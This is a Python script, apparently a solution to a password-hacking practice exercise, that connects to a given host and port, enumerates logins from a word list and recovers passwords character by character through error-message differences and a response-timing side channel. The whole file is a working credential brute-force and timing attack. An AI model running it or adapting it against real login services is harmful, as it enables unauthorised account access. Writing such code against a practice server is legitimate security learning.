import time


class MyNumbers:
    def __init__(self, allowed_letters, word_length):
        self.allowed_letters = allowed_letters
        self.word_length = word_length
        self.count_vec = [0] * self.word_length
        self.finished = False

    def act(self):
        out = ""
        for i in range(self.word_length):
            out = out + self.allowed_letters[self.count_vec[i]]
        return out

    def __iter__(self):
        self.count_vec = [0] * self.word_length
        return self

    def __next__(self):
        incr = 1
        col = 0
        base = len(self.allowed_letters)
        while incr == 1:

            if col == self.word_length:
                self.finished = True
                break
            else:
                mem = self.count_vec[col]
                self.count_vec[col] = (self.count_vec[col] + incr) % base
                incr = (mem + incr) // base
                if incr == 0:
                    break
                else:
                    col += 1
        out = ""
        for i in range(self.word_length):
            out = out + self.allowed_letters[self.count_vec[i]]
        return out
def experiment(data_loc):
    global client_socket
    data_encoded = data_loc.encode()
    client_socket.send(data_encoded)
    response = client_socket.recv(1024)
    response = response.decode()
    #print(response)
    #if response == "Connection success!":
    if response != "Wrong password!":
        #print(response)
        return True
    else:
        return False


import json
import logging
import timeit

def experiment_login(login_guess):

    global client_socket
    login_guess_all = {
        "login": login_guess,
        "password": "12345678"
    }
    login_guess_json = json.dumps(login_guess_all)
    data_encoded = login_guess_json.encode()
    client_socket.send(data_encoded)

    response = client_socket.recv(1024)

    response = response.decode()

    return response


def experiment_password(login_loc,password_guess):

    global client_socket
    password_guess_all = {
        "login": login_loc,
        "password": password_guess
    }
    login_guess_json = json.dumps(password_guess_all)
    data_encoded = login_guess_json.encode()
    client_socket.send(data_encoded)
    start = timeit.default_timer()*1000
    response = client_socket.recv(1024)
    end = timeit.default_timer()*1000

    response = response.decode()
    logging.info(f'Response: {response}Time taken for login/passwd: {login_loc}/{password_guess}: {end - start}')
    return response, (end-start)
def get_login():
    global bestresponse_login
    f = open(".\\logins.txt", "r")
    words = f.read().splitlines()
    f.close()

    data = []
    for item in words:
        if json.loads(experiment_login(item))['result'] == json.loads(bestresponse_login)['result']:
            return item
    return []


def get_password(login_loc1):
    logger = logging.getLogger(__name__)
    logging.basicConfig(filename="lg.txt",level=logging.INFO)
    logger.info(f'Start, Login {login_loc1}')
    allowed_letters_ = string.ascii_lowercase + string.ascii_uppercase + string.digits
    letter: string
    word_add_length = 1
    letter = []
    correct_word = ""
    while True:
        for letter in allowed_letters_:
            answer = experiment_password(login_loc1, correct_word + letter)
            res = json.loads(answer[0])['result']
            elapsed_time = answer[1]
            #logger.info(f'letter try {letter}, res: {res}')
            if res == json.loads(bestresponse_passwd)['result'] :
                return {"login": login_loc1,"password": correct_word + letter}

            if res == json.loads(goodresponse)['result'] or elapsed_time > 50:
            #    logger.info(f'letter found {letter}, res: {res}')
                correct_word = correct_word + letter
                break
            time.sleep(0.01)


import sys
import socket
import string

goodresponse = '{\n"result": "Exception happened during login"}'

badresponse_passwd = '{\n"result": "Wrong password!"\n}'
bestresponse_passwd = '{\n"result": "Connection success!"}'

badresponse_login = '{\n"result": "Wrong login!"\n}'
bestresponse_login = '{\n"result": "Wrong password!"\n}'

arguments =sys.argv[1:]
if len(arguments)!=2:
    print(f'Wrong number of arguments: {len(arguments)} instead of 2')
    sys.exit()
# creating the socket
client_socket = socket.socket()
hostname = arguments[0]
port = int(arguments[1])
address = (hostname, port)
client_socket.connect(address)

if login := get_login():
    #print(login)
    if resp := get_password(login):
        print(json.dumps(resp))

